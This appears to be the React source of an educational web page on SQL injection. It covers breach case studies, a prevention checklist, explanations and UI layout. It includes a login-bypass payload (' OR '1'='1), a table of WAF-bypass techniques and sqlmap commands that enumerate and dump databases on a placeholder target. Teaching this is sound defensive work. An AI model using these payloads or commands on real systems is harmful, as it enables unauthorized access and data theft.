    lesson: "Legacy systems require security audits. Young attackers can exploit basic SQLi.",
    cost: "$77 million and CEO resignation",
  },
  {
    name: "Equifax (2017)",
    impact: "147 million people's data exposed",
    technique: "Struts vulnerability + SQL access",
    lesson: "Patch management is critical. SQLi can be part of chained attacks.",
    cost: "$1.4 billion in total costs",
  },
];

const preventionChecklist = [
  { item: "Use parameterized queries or prepared statements everywhere", priority: "Critical" },
  { item: "Never build SQL with string concatenation from user input", priority: "Critical" },
  { item: "Validate data types and use allowlists for enums", priority: "High" },
  { item: "Limit database account permissions to required tables", priority: "High" },
  { item: "Avoid exposing SQL errors to end users", priority: "High" },
  { item: "Keep ORM and database drivers up to date", priority: "Medium" },
  { item: "Add logging and alerting for SQL errors and anomalies", priority: "Medium" },
  { item: "Use WAF rules as defense in depth (not primary fix)", priority: "Medium" },
  { item: "Network segmentation to protect database servers", priority: "Medium" },
  { item: "Regular code reviews and SAST scanning", priority: "Medium" },
];

const wafBypassTechniques = [
  { technique: "Case Manipulation", description: "Mix uppercase/lowercase", example: "SeLeCt, uNiOn" },
  { technique: "URL Encoding", description: "Encode characters", example: "%27 for ', %20 for space" },
  { technique: "Double Encoding", description: "Double encode when apps decode twice", example: "%2527 = %27 = '" },
  { technique: "Comment Injection", description: "Use SQL comments to break up keywords", example: "SEL/**/ECT" },
  { technique: "Whitespace Alternatives", description: "Replace spaces with tabs, newlines", example: "SELECT%09*%09FROM" },
  { technique: "Null Byte Injection", description: "Insert null bytes", example: "%00 at strategic positions" },
  { technique: "HTTP Parameter Pollution", description: "Send duplicate parameters", example: "?id=1&id=2' OR '1'='1" },
];

const sqlmapCommands = [
  { command: "sqlmap -u 'http://target.com/page?id=1'", description: "Basic GET parameter test" },
  { command: "sqlmap -u 'http://target.com/page' --data='user=test&pass=test'", description: "POST parameter test" },
  { command: "sqlmap -r request.txt", description: "Test from saved HTTP request file" },
  { command: "sqlmap -u 'URL?id=1' --dbs", description: "Enumerate databases" },
  { command: "sqlmap -u 'URL?id=1' -D dbname --tables", description: "List tables in a database" },
  { command: "sqlmap -u 'URL?id=1' -D db -T table --columns", description: "List columns in a table" },
  { command: "sqlmap -u 'URL?id=1' -D db -T table -C col1,col2 --dump", description: "Dump specific columns" },
  { command: "sqlmap -u 'URL?id=1' --level=5 --risk=3", description: "Maximum testing depth" },
  { command: "sqlmap -u 'URL?id=1' --tamper=space2comment", description: "Apply tamper scripts" },
  { command: "sqlmap -u 'URL?id=1' --proxy='http://127.0.0.1:8080'", description: "Route through proxy" },
];

// ========== MAIN COMPONENT ==========
const SQLInjectionPage: React.FC = () => {
  const theme = useTheme();
  const navigate = useNavigate();
  const accent = "#f97316"; // Orange accent color for SQL Injection
  const isMobile = useMediaQuery(theme.breakpoints.down("lg"));

  // Navigation State
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState("");

  const pageContext = `SQL Injection (SQLi) - A comprehensive guide covering injection attack types including Union-based SQLi, Blind SQLi (Boolean and Time-based), Error-based SQLi, Out-of-band SQLi. Topics include: query structure, parameter manipulation, authentication bypass, data extraction, second-order injection, impact and risk, ORM pitfalls, stored procedures exploitation, prevention techniques like parameterized queries, prepared statements, input validation, and secure database design patterns.`;

  // Section Navigation Items
  const sectionNavItems = [
    { id: "intro", label: "Introduction", icon: <SchoolIcon /> },
    { id: "impact-risk", label: "Impact & Risk", icon: <WarningIcon /> },
    { id: "how-it-works", label: "How It Works", icon: <CodeIcon /> },
    { id: "sqli-types", label: "Injection Types", icon: <BugReportIcon /> },
    { id: "entry-points", label: "Entry Points", icon: <ApiIcon /> },
    { id: "detection", label: "Detection", icon: <SearchIcon /> },
    { id: "prevention", label: "Prevention", icon: <ShieldIcon /> },
    { id: "orm-pitfalls", label: "ORM Pitfalls", icon: <MemoryIcon /> },
    { id: "secure-code", label: "Secure Code Examples", icon: <LockIcon /> },
    { id: "db-specific", label: "Database Specifics", icon: <StorageIcon /> },
    { id: "payloads", label: "Common Payloads", icon: <DataObjectIcon /> },
    { id: "waf-bypass", label: "WAF Bypass", icon: <TuneIcon /> },
    { id: "tools", label: "SQLMap & Tools", icon: <TerminalIcon /> },
    { id: "case-studies", label: "Case Studies", icon: <HistoryIcon /> },
    { id: "quiz", label: "Quiz", icon: <QuizIcon /> },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      let currentSection = "";

      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  const currentIndex = sectionNavItems.findIndex((item) => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / sectionNavItems.length) * 100 : 0;

  // Sidebar Navigation Component
  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 220,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 3,
        border: `1px solid ${alpha(accent, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        display: { xs: "none", lg: "block" },
        "&::-webkit-scrollbar": { width: 6 },
        "&::-webkit-scrollbar-thumb": { bgcolor: alpha(accent, 0.3), borderRadius: 3 },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Typography
          variant="subtitle2"
          sx={{ fontWeight: 700, mb: 1, color: accent, display: "flex", alignItems: "center", gap: 1 }}
        >
          <ListAltIcon sx={{ fontSize: 18 }} />
          Course Navigation
        </Typography>
        <Box sx={{ mb: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">Progress</Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>
              {Math.round(progressPercent)}%
            </Typography>
          </Box>
          <LinearProgress
            variant="determinate"
            value={progressPercent}
            sx={{
              height: 6,
              borderRadius: 3,
              bgcolor: alpha(accent, 0.1),
              "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 },
            }}
          />
        </Box>
        <Divider sx={{ mb: 1 }} />
        <List dense sx={{ mx: -1 }}>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1.5,
                mb: 0.25,
                py: 0.5,
                cursor: "pointer",
                bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                "&:hover": { bgcolor: alpha(accent, 0.08) },
                transition: "all 0.15s ease",
              }}
            >
              <ListItemIcon sx={{ minWidth: 24, fontSize: "0.9rem" }}>{item.icon}</ListItemIcon>
              <ListItemText
                primary={
                  <Typography
                    variant="caption"
                    sx={{
                      fontWeight: activeSection === item.id ? 700 : 500,
                      color: activeSection === item.id ? accent : "text.secondary",
                    }}
                  >
                    {item.label}
                  </Typography>
                }
              />
            </ListItem>
          ))}
        </List>
      </Box>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="SQL Injection (SQLi)" pageContext={pageContext}>
      {/* Floating Navigation Button - Mobile Only */}
      <Tooltip title="Navigate Sections" placement="left">
        <Fab
          color="primary"
          onClick={() => setNavDrawerOpen(true)}
          sx={{
            position: "fixed",
            bottom: 90,
            right: 24,
            zIndex: 1000,
            bgcolor: accent,
            "&:hover": { bgcolor: "#ea580c" },
            boxShadow: `0 4px 20px ${alpha(accent, 0.4)}`,
            display: { xs: "flex", lg: "none" },
          }}
        >
          <ListAltIcon />
        </Fab>
      </Tooltip>

      {/* Scroll to Top Button - Mobile Only */}
      <Tooltip title="Scroll to Top" placement="left">
        <Fab
          size="small"
          onClick={scrollToTop}
          sx={{
            position: "fixed",
            bottom: 32,
            right: 28,
            zIndex: 1000,
            bgcolor: alpha(accent, 0.15),
            color: accent,
            "&:hover": { bgcolor: alpha(accent, 0.25) },
            display: { xs: "flex", lg: "none" },
          }}
        >
          <KeyboardArrowUpIcon />
        </Fab>
      </Tooltip>

      {/* Navigation Drawer - Mobile */}
      <Drawer
        anchor="right"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        PaperProps={{
          sx: {
            width: isMobile ? "85%" : 320,
            bgcolor: theme.palette.background.paper,
            backgroundImage: "none",
          },
        }}
      >
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
              <ListAltIcon sx={{ color: accent }} />
              Course Navigation
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} size="small">
              <CloseIcon />
            </IconButton>
          </Box>

          <Divider sx={{ mb: 2 }} />

          <Box sx={{ mb: 2, p: 1.5, borderRadius: 2, bgcolor: alpha(accent, 0.05) }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
              <Typography variant="caption" color="text.secondary">Progress</Typography>
              <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>
                {Math.round(progressPercent)}%
              </Typography>
            </Box>
            <LinearProgress
              variant="determinate"
              value={progressPercent}
              sx={{
                height: 6,
                borderRadius: 3,
                bgcolor: alpha(accent, 0.1),
                "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 },
              }}
            />
          </Box>

          <List dense sx={{ mx: -1 }}>
            {sectionNavItems.map((item) => (
              <ListItem
                key={item.id}
                onClick={() => scrollToSection(item.id)}
                sx={{
                  borderRadius: 2,
                  mb: 0.5,
                  cursor: "pointer",
                  bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                  borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                  "&:hover": { bgcolor: alpha(accent, 0.1) },
                  transition: "all 0.2s ease",
                }}
              >
                <ListItemIcon sx={{ minWidth: 32, fontSize: "1.1rem" }}>{item.icon}</ListItemIcon>
                <ListItemText
                  primary={
                    <Typography
                      variant="body2"
                      sx={{
                        fontWeight: activeSection === item.id ? 700 : 500,
                        color: activeSection === item.id ? accent : "text.primary",
                      }}
                    >
                      {item.label}
                    </Typography>
                  }
                />
                {activeSection === item.id && (
                  <Chip
                    label="Current"
                    size="small"
                    sx={{ height: 20, fontSize: "0.65rem", bgcolor: alpha(accent, 0.2), color: accent }}
                  />
                )}
              </ListItem>
            ))}
          </List>

          <Divider sx={{ my: 2 }} />

          <Box sx={{ display: "flex", gap: 1 }}>
            <Button
              size="small"
              variant="outlined"
              onClick={scrollToTop}
              startIcon={<KeyboardArrowUpIcon />}
              sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}
            >
              Top
            </Button>
            <Button
              size="small"
              variant="outlined"
              onClick={() => scrollToSection("quiz")}
              startIcon={<QuizIcon />}
              sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}
            >
              Quiz
            </Button>
          </Box>
        </Box>
      </Drawer>

      <Box sx={{ display: "flex", gap: 3, maxWidth: 1400, mx: "auto", px: { xs: 2, sm: 3 }, py: 4 }}>
        {sidebarNav}

        <Box sx={{ flex: 1, minWidth: 0 }}>
          <Container maxWidth="lg" sx={{ py: 0, px: 0 }} id="top">
            {/* Back Button */}
            <Chip
              component={Link}
              to="/learn"
              icon={<ArrowBackIcon />}
              label="Back to Learning Hub"
              clickable
              variant="outlined"
              sx={{ borderRadius: 2, mb: 3 }}
            />

            {/* Hero Banner */}
            <Paper
              sx={{
                p: 4,
                mb: 4,
                borderRadius: 4,
                background: `linear-gradient(135deg, ${alpha(accent, 0.15)} 0%, ${alpha("#f59e0b", 0.1)} 100%)`,
                border: `1px solid ${alpha(accent, 0.2)}`,
                position: "relative",
                overflow: "hidden",
              }}
            >
              <Box
                sx={{
                  position: "absolute",
                  top: -50,
                  right: -50,
                  width: 200,
                  height: 200,
                  borderRadius: "50%",
                  background: `linear-gradient(135deg, ${alpha(accent, 0.1)}, transparent)`,
                }}
              />
              <Box sx={{ display: "flex", alignItems: "center", gap: 3, position: "relative" }}>
                <Box
                  sx={{
                    width: 80,
                    height: 80,
                    borderRadius: 3,
                    background: `linear-gradient(135deg, ${accent}, #f59e0b)`,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    boxShadow: `0 8px 32px ${alpha(accent, 0.3)}`,
                  }}
                >
                  <StorageIcon sx={{ fontSize: 45, color: "white" }} />
                </Box>
                <Box>
                  <Chip label="Web Security" size="small" sx={{ mb: 1, fontWeight: 600, bgcolor: alpha(accent, 0.1), color: accent }} />
                  <Typography variant="h3" sx={{ fontWeight: 800, mb: 1 }}>
                    SQL Injection (SQLi)
                  </Typography>
                  <Typography variant="h6" color="text.secondary" sx={{ maxWidth: 600 }}>
                    Master database security from fundamentals to advanced techniques
                  </Typography>
                </Box>
              </Box>
            </Paper>

            {/* Warning Alert */}
            <Alert severity="warning" sx={{ mb: 4, borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>Defensive Learning Only</AlertTitle>
              Use this material only for authorized testing, CTF challenges, and secure coding education.
              The focus is on prevention, detection, and safe verification techniques.
            </Alert>

            {/* ========== SECTION: INTRODUCTION ========== */}
            <Paper
              id="intro"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <InfoIcon sx={{ color: accent }} />
                Introduction to SQL Injection
              </Typography>

              {/* Prerequisites Box */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                  Prerequisites - What You Should Know
                </Typography>
                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                  Before diving into SQL injection, it helps to understand a few basics. Don't worry if you're not an expert -
                  we'll explain everything as we go, but having some familiarity with these concepts will make learning easier:
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <List dense>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
                        <ListItemText
                          primary="Basic SQL commands"
                          secondary="SELECT, INSERT, UPDATE, DELETE - the fundamental operations for reading and modifying data"
                        />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
                        <ListItemText
                          primary="What a database is"
                          secondary="A structured collection of data organized into tables with rows and columns"
                        />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
                        <ListItemText
                          primary="How web forms work"
                          secondary="Text boxes, buttons, and how data gets sent from your browser to a server"
                        />
                      </ListItem>
                    </List>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <List dense>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
                        <ListItemText
                          primary="Client-server model"
                          secondary="Your browser (client) sends requests, the server processes them and sends responses"
                        />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
                        <ListItemText
                          primary="Basic programming concepts"
                          secondary="Variables, strings, and how programs combine text (concatenation)"
                        />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><CheckCircleIcon sx={{ color: "#3b82f6" }} fontSize="small" /></ListItemIcon>
                        <ListItemText
                          primary="HTTP basics"
                          secondary="GET and POST requests - how data travels between your browser and websites"
                        />
                      </ListItem>
                    </List>
                  </Grid>
                </Grid>
              </Paper>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                What is SQL Injection?
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                SQL Injection (often abbreviated as SQLi) is one of the oldest and most dangerous web application vulnerabilities,
                first documented in the late 1990s. Despite being well-understood for over two decades, it consistently remains
                in the OWASP Top 10 list of critical security risks. Why? Because it's easy to introduce accidentally and
                devastating when exploited.
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                At its core, SQL injection occurs when an application builds database queries by directly inserting user input
                into SQL commands. The database has no way to tell the difference between the developer's intended query and
                the attacker's malicious additions - it simply executes whatever SQL string it receives.
              </Typography>

              {/* Analogy Box */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
                  Real-World Analogy: The Library Card System
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  Imagine a library where you fill out a card to request a book. You write "Harry Potter" and hand it to the librarian,
                  who has a form that says "Please get me the book called [your input] from the shelf." This works fine for normal requests.
                </Typography>
                <Typography variant="body2" sx={{ mt: 1, lineHeight: 1.7 }}>
                  But what if you wrote: <strong>"Harry Potter" and also "empty the cash register"</strong>? If the librarian blindly
                  follows instructions without questioning them, you've just "injected" an unauthorized command. SQL injection works
                  the same way - attackers craft special input that becomes part of the database command itself.
                </Typography>
              </Paper>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
                The Core Problem: Data Treated as Code
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                The fundamental issue is simple but critical: <strong>user-supplied data is being treated as executable code</strong>.
                When you type a search term into a web form, that text should be treated purely as data - a value to look up.
                But if the application concatenates (combines) your input directly into a SQL query string, an attacker can
                craft special input that changes the query's meaning entirely.
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Consider a simple login form. Behind the scenes, the application might check your credentials like this:
              </Typography>

              <CodeBlock
                language="sql"
                title="What the developer intended"
                code={`SELECT * FROM users WHERE username = 'john' AND password = 'secret123'
-- This returns the user record IF both username AND password match`}
              />

              <Typography variant="body1" sx={{ mb: 2, mt: 2, lineHeight: 1.8 }}>
                But if the application just concatenates user input, an attacker can enter <code>' OR '1'='1</code> as the
                username. The query becomes:
              </Typography>

              <CodeBlock
                language="sql"
                title="What the attacker makes it do"
                code={`SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
-- The OR '1'='1' is always true, so this returns ALL users!
-- The attacker bypasses login without knowing any password`}
              />

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
                Why This Matters
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                SQL injection isn't just a theoretical concern - it has caused some of the largest data breaches in history.
                Through SQLi, attackers can:
              </Typography>

              <Grid container spacing={2} sx={{ mb: 3 }}>
                {[
                  { icon: <SearchIcon />, title: "Read sensitive data", desc: "Access customer records, passwords, credit cards, medical records - anything in the database" },
                  { icon: <WarningIcon />, title: "Modify or delete data", desc: "Change prices, transfer money, delete records, or corrupt entire databases" },
                  { icon: <LockIcon />, title: "Bypass authentication", desc: "Log in as any user including administrators without knowing passwords" },
                  { icon: <TerminalIcon />, title: "Execute system commands", desc: "In some configurations, run operating system commands on the server" },
                ].map((item, idx) => (
                  <Grid item xs={12} sm={6} key={idx}>
                    <Paper sx={{ p: 2, height: "100%", bgcolor: alpha("#ef4444", 0.03), borderRadius: 2 }}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                        <Box sx={{ color: "#ef4444" }}>{item.icon}</Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.title}</Typography>
                      </Box>
                      <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
                Where SQL Injection Can Occur
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                SQLi is not limited to web applications. Any system that accepts input and builds SQL queries can be vulnerable.
                This includes:
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                <strong>Web applications</strong> - Login forms, search boxes, contact forms, shopping carts, user profiles.
                <strong> APIs</strong> - REST endpoints, GraphQL queries, SOAP services that accept parameters.
                <strong> Mobile apps</strong> - Any app that communicates with a backend database.
                <strong> Desktop applications</strong> - Software that connects to SQL databases.
                <strong> Internal tools</strong> - Admin panels, reporting systems, data import utilities.
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Attackers look for any path that lets them influence query structure - form fields, URL parameters, cookies,
                HTTP headers (like User-Agent or Referer), and even file upload names. If it reaches a SQL query, it's a
                potential attack vector.
              </Typography>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
                The Solution: Separation of Code and Data
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                The fix for SQL injection is conceptually simple: <strong>never treat user input as part of the SQL command</strong>.
                Instead, use parameterized queries (also called prepared statements). With this approach, you define the SQL
                structure first, then pass user data separately. The database knows exactly which parts are commands and which
                are data - and it will never execute data as commands.
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                This isn't about clever filtering or trying to detect malicious input. Those approaches are error-prone and
                can be bypassed. Parameterization is the fundamental fix because it addresses the root cause: keeping code
                and data completely separate.
              </Typography>

              <Alert severity="success" sx={{ mt: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>What You'll Learn in This Guide</AlertTitle>
                <Grid container spacing={2}>
                  <Grid item xs={12} sm={6} md={3}>
                    <Typography variant="body2">&#8226; How SQLi attacks work step-by-step</Typography>
                    <Typography variant="body2">&#8226; Different injection types explained</Typography>
                    <Typography variant="body2">&#8226; Common entry points to audit</Typography>
                    <Typography variant="body2">&#8226; Impact and risk assessment basics</Typography>
                  </Grid>
                  <Grid item xs={12} sm={6} md={3}>
                    <Typography variant="body2">&#8226; Detection techniques and signals</Typography>
                    <Typography variant="body2">&#8226; Database-specific syntax differences</Typography>
                    <Typography variant="body2">&#8226; How attackers bypass WAFs</Typography>
                  </Grid>
                  <Grid item xs={12} sm={6} md={3}>
                    <Typography variant="body2">&#8226; Prevention strategies that work</Typography>
                    <Typography variant="body2">&#8226; Secure code patterns in multiple languages</Typography>
                    <Typography variant="body2">&#8226; ORM best practices and pitfalls</Typography>
                    <Typography variant="body2">&#8226; Safe query builder and raw SQL patterns</Typography>
                  </Grid>
                  <Grid item xs={12} sm={6} md={3}>
                    <Typography variant="body2">&#8226; SQLMap tool usage for testing</Typography>
                    <Typography variant="body2">&#8226; Real-world breach case studies</Typography>
                    <Typography variant="body2">&#8226; Safe testing methodologies</Typography>
                  </Grid>
                </Grid>
              </Alert>
            </Paper>

            {/* ========== SECTION: IMPACT & RISK ========== */}
            <Paper
              id="impact-risk"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <WarningIcon sx={{ color: accent }} />
                Impact and Risk
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                SQL injection is classified as a critical risk because it targets the database directly. If attackers can
                control a query, they can often bypass application logic, read sensitive data, and modify or destroy records.
                The impact is not limited to one page or feature. It can compromise the entire data layer.
              </Typography>

              <Grid container spacing={3} sx={{ mb: 3 }}>
                {[
                  {
                    title: "Confidentiality",
                    desc: "Exfiltration of user data, credentials, tokens, or internal business records.",
                    color: "#ef4444",
                  },
                  {
                    title: "Integrity",
                    desc: "Unauthorized changes such as role escalation, tampering with orders, or edits to audit logs.",
                    color: "#f59e0b",
                  },
                  {
                    title: "Availability",
                    desc: "Dropping tables, lock contention, or resource exhaustion that takes services offline.",
                    color: "#8b5cf6",
                  },
                  {
                    title: "Compliance and Legal",
                    desc: "Regulatory exposure for PII and financial data, breach notifications, and fines.",
                    color: "#3b82f6",
                  },
                ].map((item) => (
                  <Grid item xs={12} sm={6} key={item.title}>
                    <Paper sx={{ p: 2.5, borderRadius: 2, border: `1px solid ${alpha(item.color, 0.2)}`, height: "100%" }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: item.color, mb: 1 }}>
                        {item.title}
                      </Typography>
                      <Typography variant="body2" color="text.secondary">
                        {item.desc}
                      </Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
                Common Attacker Objectives
              </Typography>

              <Grid container spacing={2} sx={{ mb: 2 }}>
                {[
                  "Bypass authentication to access protected accounts",
                  "Enumerate database schema and discover sensitive tables",
                  "Extract credentials, PII, or payment data",
                  "Modify records to change prices, roles, or inventory",
                  "Plant backdoors or create rogue admin users",
                  "Cover tracks by deleting logs or audit trails",
                ].map((item) => (
                  <Grid item xs={12} md={6} key={item}>
                    <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1 }}>
                      <CheckCircleIcon sx={{ color: accent, mt: 0.3 }} fontSize="small" />
                      <Typography variant="body2">{item}</Typography>
                    </Box>
                  </Grid>
                ))}
              </Grid>

              <Alert severity="warning" sx={{ mt: 2, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Risk Reality Check</AlertTitle>
                Treat any confirmed SQL injection as a high-severity issue. Even a "read-only" injection can expose
                sensitive data or be chained with other weaknesses to achieve full compromise.
              </Alert>
            </Paper>

            {/* ========== SECTION: HOW IT WORKS ========== */}
            <Paper
              id="how-it-works"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <CodeIcon sx={{ color: accent }} />
                How SQL Injection Works
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                To understand SQL injection, you need to understand how web applications typically interact with databases.
                When you fill out a form on a website - like a login page or search box - that data travels from your
                browser to a web server. The server then needs to look up or modify information in a database.
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                To communicate with the database, the application constructs a SQL (Structured Query Language) command.
                SQL is the standard language for telling databases what to do: "find this record," "add this user,"
                "delete this order," and so on. The problem arises in <strong>how</strong> these commands are built.
              </Typography>

              {/* Analogy Box */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1, color: "#8b5cf6" }}>
                  Think of it Like a Mad Libs Game
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7, mb: 1 }}>
                  Remember Mad Libs? You have a story with blanks, and you fill in words: "The [ADJECTIVE] [NOUN] went to the [PLACE]."
                  If someone writes "happy cat" and "park," you get a normal story.
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  But what if someone writes: <strong>"happy cat went to the park. THE END. New story: The evil villain stole everything"</strong>?
                  They've broken out of the intended structure and injected their own content. SQL injection works exactly this way -
                  attackers write input that "breaks out" of where it should go and becomes part of the command itself.
                </Typography>
              </Paper>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                The Attack Flow - Step by Step
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                Let's walk through exactly what happens during a SQL injection attack. Understanding each step helps you
                see why this vulnerability exists and how to prevent it.
              </Typography>

              <Grid container spacing={2} sx={{ mb: 4 }}>
                {[
                  { step: 1, title: "User Submits Input", desc: "Someone types data into a form, URL, or sends it via an API. This could be a login form, search box, or any input field." },
                  { step: 2, title: "Server Receives Data", desc: "The web server receives this input. At this point, it's just text - the server doesn't know if it's legitimate or malicious." },
                  { step: 3, title: "Query is Constructed", desc: "The application builds a SQL command by inserting the user's input into a template. This is where things can go wrong." },
                  { step: 4, title: "Database Executes", desc: "The complete SQL string is sent to the database, which runs it. The database has no idea which parts came from the developer and which from the user." },
                ].map((item) => (
                  <Grid item xs={12} sm={6} md={3} key={item.step}>
                    <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha(accent, 0.05), borderRadius: 2, height: "100%" }}>
                      <Chip label={`Step ${item.step}`} size="small" sx={{ mb: 1, bgcolor: accent, color: "white" }} />
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>{item.title}</Typography>
                      <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

